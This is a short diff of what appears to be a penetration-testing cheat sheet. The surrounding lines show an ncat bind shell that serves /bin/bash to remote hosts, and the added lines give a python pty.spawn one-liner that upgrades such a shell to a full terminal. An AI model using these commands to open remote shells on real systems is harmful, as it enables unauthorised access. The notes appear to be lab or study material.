@@ -27,6 +27,11 @@ ncat -k -nvlp <port> -e "/bin/bash" --allow <ip's go here>
 ncat -nv <ip address of local box> <port>
 ```
 
+# Getting a complete shell!
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
 
 ### If ncat needs to be deleated
 ```
